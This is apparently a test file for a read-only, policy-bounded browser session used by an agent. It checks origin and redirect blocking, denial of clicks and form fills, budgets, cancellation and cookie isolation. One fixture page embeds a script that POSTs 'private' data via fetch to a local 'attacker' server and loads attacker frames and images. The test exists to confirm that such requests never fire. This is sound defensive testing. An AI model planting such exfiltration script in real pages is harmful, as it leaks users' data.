import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { createServer } from 'node:http';
import type { Server, ServerResponse } from 'node:http';
import type { AddressInfo } from 'node:net';
import type { Browser } from 'playwright';
import { launchBrowser } from './browser.ts';
import { createFixtureServer } from '../../apps/fixtures/src/server.ts';
import { RunBudget } from '../../packages/agent/src/budget.ts';
import { ReadPolicy } from '../../packages/policy/src/read-policy.ts';
import { openReadSession } from '../../packages/browser/src/read-session.ts';
import type { ReadSession } from '../../packages/browser/src/read-session.ts';

let browser: Browser;
const servers: Server[] = [];
const sessions: ReadSession[] = [];

function html(response: ServerResponse, body = '<h1>Fixture</h1>') {
  response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  response.end(body);
}

async function listen(server: Server): Promise<string> {
  servers.push(server);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  return `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
}

async function open(origin: string, limits: Record<string, number> = {}, signal?: AbortSignal) {
  const budget = new RunBudget({ maxActions: 5, timeoutMs: 10_000, ...limits });
  const session = await openReadSession(browser, new ReadPolicy([{ origin, paths: ['/'] }]), budget, signal);
  sessions.push(session);
  return { session, budget };
}

const fixtureHeading = { by: 'role', role: 'heading', name: 'Fixture' };

beforeAll(async () => { browser = await launchBrowser(); });
afterEach(async () => {
  await Promise.all(sessions.splice(0).map((session) => session.close()));
  expect(browser.contexts()).toHaveLength(0);
  await Promise.all(servers.splice(0).map(async (server) => {
    server.closeAllConnections();
    await new Promise<void>((resolve, reject) => server.close((error) => error ? reject(error) : resolve()));
  }));
});
afterAll(async () => { await browser?.close(); });

describe('bounded fixture read sessions', () => {
  it('navigates, waits, and extracts through policy without exposing a raw page', async () => {
    const origin = await listen(createFixtureServer());
    const { session, budget } = await open(origin);
    await session.execute({ id: 'browse', type: 'navigate', url: `${origin}/?category=laptops&inStockOnly=true&limit=3` });
    const target = { by: 'role', role: 'article', name: 'Field 12' };
    await session.execute({ id: 'wait', type: 'waitFor', target, timeoutMs: 1000 });
    const result = await session.execute({ id: 'read', type: 'extract', target });
    expect(result.text).toContain('1599.00 PLN');
    expect(result.text).toContain('In stock');
    expect(result.truncated).toBe(false);
    expect(budget.snapshot()).toMatchObject({ actions: 3, requests: 1 });
    expect(Object.keys(session).sort()).toEqual(['close', 'execute']);
  });

  it('blocks an ungranted origin before sending any request', async () => {
    const allowed = await listen(createServer((_request, response) => html(response)));
    let hits = 0;
    const denied = await listen(createServer((_request, response) => { hits += 1; html(response); }));
    const { session } = await open(allowed);
    await expect(session.execute({ id: 'escape', type: 'navigate', url: denied })).rejects.toMatchObject({ code: 'origin_denied' });
    expect(hits).toBe(0);
  });

  it('does not follow a redirect to an ungranted server', async () => {
    let destinationHits = 0;
    const destination = await listen(createServer((_request, response) => { destinationHits += 1; html(response); }));
    let originHits = 0;
    const origin = await listen(createServer((_request, response) => {
      originHits += 1;
      response.writeHead(302, { Location: destination });
      response.end();
    }));
    const { session } = await open(origin);
    await expect(session.execute({ id: 'redirect', type: 'navigate', url: origin })).rejects.toMatchObject({ code: 'redirect_denied' });
    expect(originHits).toBe(1);
    expect(destinationHits).toBe(0);
  });

  it('does not follow same-origin redirects either', async () => {
    let hits = 0;
    const origin = await listen(createServer((_request, response) => {
      hits += 1;
      response.writeHead(307, { Location: '/?again=1' });
      response.end();
    }));
    const { session } = await open(origin);
    await expect(session.execute({ id: 'loop', type: 'navigate', url: origin })).rejects.toMatchObject({ code: 'redirect_denied' });
    expect(hits).toBe(1);
  });

  it.each([
    { id: 'click', type: 'click', target: fixtureHeading },
    { id: 'fill', type: 'fill', target: fixtureHeading, value: 'private' },
    { id: 'select', type: 'select', target: fixtureHeading, value: 'private' },
  ])('denies mutation $type before it can act', async (action) => {
    let hits = 0;
    const origin = await listen(createServer((_request, response) => { hits += 1; html(response); }));
    const { session, budget } = await open(origin);
    await session.execute({ id: 'browse', type: 'navigate', url: origin });
    await expect(session.execute(action)).rejects.toMatchObject({ code: 'approval_required' });
    expect(hits).toBe(1);
    expect(budget.snapshot().actions).toBe(1);
  });

  it('does not execute page scripts or load attacker frames and images', async () => {
    let hits = 0;
    const attacker = await listen(createServer((_request, response) => { hits += 1; html(response); }));
    const origin = await listen(createServer((_request, response) => html(response,
      `<h1>Fixture</h1><script>fetch('${attacker}',{method:'POST',body:'private'});document.querySelector('h1').textContent='Changed';</script><iframe src="${attacker}"></iframe><img src="${attacker}">`)));
    const { session } = await open(origin);
    await session.execute({ id: 'browse', type: 'navigate', url: origin });
    expect((await session.execute({ id: 'read', type: 'extract', target: fixtureHeading })).text).toBe('Fixture');
    expect(hits).toBe(0);
  });

  it('rejects ambiguous targets rather than taking the first match', async () => {
    const origin = await listen(createServer((_request, response) => html(response, '<h1>Fixture</h1><h1>Fixture</h1>')));
    const { session } = await open(origin);
    await session.execute({ id: 'browse', type: 'navigate', url: origin });
    await expect(session.execute({ id: 'read', type: 'extract', target: fixtureHeading })).rejects.toMatchObject({ code: 'ambiguous_target' });
  });

  it('bounds a missing locator wait and closes the context on failure', async () => {
    const origin = await listen(createServer((_request, response) => html(response)));
    const { session } = await open(origin, { actionTimeoutMs: 1000 });
    await session.execute({ id: 'browse', type: 'navigate', url: origin });
    await expect(session.execute({ id: 'wait', type: 'waitFor', target: { ...fixtureHeading, name: 'Missing' }, timeoutMs: 30 })).rejects.toMatchObject({ code: 'action_timeout' });
    expect(browser.contexts()).toHaveLength(0);
  });

  it('stops at the action limit without performing an extra read', async () => {
    const origin = await listen(createServer((_request, response) => html(response)));
    const { session, budget } = await open(origin, { maxActions: 1 });
    await session.execute({ id: 'browse', type: 'navigate', url: origin });
    await expect(session.execute({ id: 'read', type: 'extract', target: fixtureHeading })).rejects.toMatchObject({ code: 'action_budget_exhausted' });
    expect(budget.snapshot().actions).toBe(1);
  });

  it('stops before an extra outbound request when the network budget is exhausted', async () => {
    let hits = 0;
    const origin = await listen(createServer((_request, response) => { hits += 1; html(response); }));
    const { session, budget } = await open(origin, { maxRequests: 1 });
    await session.execute({ id: 'first', type: 'navigate', url: origin });
    await expect(session.execute({ id: 'second', type: 'navigate', url: `${origin}/?second=1` })).rejects.toMatchObject({ code: 'request_budget_exhausted' });
    expect(hits).toBe(1);
    expect(budget.snapshot().requests).toBe(1);
  });

  it('rejects repeated action IDs', async () => {
    const origin = await listen(createServer((_request, response) => html(response)));
    const { session } = await open(origin);
    await session.execute({ id: 'once', type: 'navigate', url: origin });
    await expect(session.execute({ id: 'once', type: 'extract', target: fixtureHeading })).rejects.toMatchObject({ code: 'duplicate_action' });
  });

  it('rejects concurrent proposals without disrupting the accepted action', async () => {
    const origin = await listen(createServer((_request, response) => {
      setTimeout(() => { if (!response.destroyed) html(response); }, 80).unref();
    }));
    const { session } = await open(origin);
    const first = session.execute({ id: 'first', type: 'navigate', url: origin });
    await expect(session.execute({ id: 'second', type: 'extract', target: fixtureHeading })).rejects.toMatchObject({ code: 'concurrent_action' });
    expect((await first).type).toBe('navigate');
  });

  it('cancels a pending request and releases its context', async () => {
    let arrived!: () => void;
    const arrival = new Promise<void>((resolve) => { arrived = resolve; });
    const origin = await listen(createServer((_request, response) => {
      arrived();
      setTimeout(() => { if (!response.destroyed) html(response); }, 1000).unref();
    }));
    const controller = new AbortController();
    const { session } = await open(origin, {}, controller.signal);
    const pending = session.execute({ id: 'browse', type: 'navigate', url: origin });
    const rejected = expect(pending).rejects.toMatchObject({ code: 'cancelled' });
    await arrival;
    controller.abort();
    await rejected;
    expect(browser.contexts()).toHaveLength(0);
    await expect(session.execute({ id: 'late', type: 'navigate', url: origin })).rejects.toMatchObject({ code: 'cancelled' });
  });

  it('does not create a context for an already cancelled task', async () => {
    const controller = new AbortController();
    controller.abort();
    const budget = new RunBudget({ maxActions: 1, timeoutMs: 1000 });
    await expect(openReadSession(browser, new ReadPolicy([{ origin: 'http://127.0.0.1:4173', paths: ['/'] }]), budget, controller.signal)).rejects.toMatchObject({ code: 'cancelled' });
    expect(browser.contexts()).toHaveLength(0);
  });

  it('closes an idle context when the run deadline expires', async () => {
    const origin = await listen(createServer((_request, response) => html(response)));
    const { session } = await open(origin, { timeoutMs: 400 });
    await expect.poll(() => browser.contexts().length, { timeout: 2000 }).toBe(0);
    await expect(session.execute({ id: 'late', type: 'navigate', url: origin })).rejects.toMatchObject({ code: 'deadline_exceeded' });
  });

  it('caps extracted text and declares truncation', async () => {
    const origin = await listen(createServer((_request, response) => html(response, `<h1>${'x'.repeat(100)}</h1>`)));
    const { session } = await open(origin, { maxTextLength: 16 });
    await session.execute({ id: 'browse', type: 'navigate', url: origin });
    const result = await session.execute({ id: 'read', type: 'extract', target: { ...fixtureHeading, name: 'x'.repeat(100) } });
    expect(result.text).toBe('x'.repeat(16));
    expect(result.truncated).toBe(true);
  });

  it('rejects non-HTML downloads before rendering', async () => {
    const origin = await listen(createServer((_request, response) => {
      response.writeHead(200, { 'Content-Type': 'application/octet-stream' });
      response.end('binary');
    }));
    const { session } = await open(origin);
    await expect(session.execute({ id: 'browse', type: 'navigate', url: origin })).rejects.toMatchObject({ code: 'unsupported_content' });
  });

  it('rejects oversized documents', async () => {
    const origin = await listen(createServer((_request, response) => html(response, 'x'.repeat(524_289))));
    const { session } = await open(origin);
    await expect(session.execute({ id: 'browse', type: 'navigate', url: origin })).rejects.toMatchObject({ code: 'response_too_large' });
  });

  it('does not inherit cookies from another context', async () => {
    const origin = await listen(createServer((request, response) => html(response, `<h1>${request.headers.cookie ?? 'No cookies'}</h1>`)));
    const other = await browser.newContext();
    try {
      await other.addCookies([{ name: 'private', value: 'secret', url: origin }]);
      const { session } = await open(origin);
      await session.execute({ id: 'browse', type: 'navigate', url: origin });
      const result = await session.execute({ id: 'read', type: 'extract', target: { ...fixtureHeading, name: 'No cookies' } });
      expect(result.text).toBe('No cookies');
    } finally {
      await other.close();
    }
  });
});

it('extracts a bounded product snapshot from the named results region', async () => {
  const origin = await listen(createFixtureServer());
  const { session } = await open(origin);
  await session.execute({ id: 'browse', type: 'navigate', url: `${origin}/?category=laptops&inStockOnly=true&limit=3` });
  const result = await session.execute({ id: 'observe', type: 'extract', format: 'products', target: { by: 'role', role: 'region', name: 'Matching products' } });
  expect(result.products).toEqual([
    { id: 'laptop-04', priceCents: 159900 },
    { id: 'laptop-01', priceCents: 189900 },
    { id: 'laptop-02', priceCents: 229900 },
  ]);
  expect(result.text).toBeNull();
  expect(Object.isFrozen(result.products)).toBe(true);
  expect(Object.isFrozen(result.products?.[0])).toBe(true);
});

it.each([
  { label: 'missing ID', body: '<article><p data-price-cents="1">Price</p></article>' },
  { label: 'empty price', body: '<article data-product-id="one"><p data-price-cents="">Price</p></article>' },
  { label: 'missing price', body: '<article data-product-id="one">Price unavailable</article>' },
  { label: 'ambiguous price', body: '<article data-product-id="one"><p data-price-cents="1">One</p><p data-price-cents="2">Two</p></article>' },
  { label: 'too many records', body: Array.from({ length: 21 }, (_, i) => `<article data-product-id="item_${i}"><p data-price-cents="1">Price</p></article>`).join('') },
])('fails closed on a product observation with $label', async ({ body }) => {
  const origin = await listen(createServer((_request, response) => html(response, `<section aria-label="Matching products">${body}</section>`)));
  const { session } = await open(origin);
  await session.execute({ id: 'browse', type: 'navigate', url: origin });
  await expect(session.execute({ id: 'observe', type: 'extract', format: 'products', target: { by: 'role', role: 'region', name: 'Matching products' } })).rejects.toMatchObject({ code: 'invalid_observation' });
});
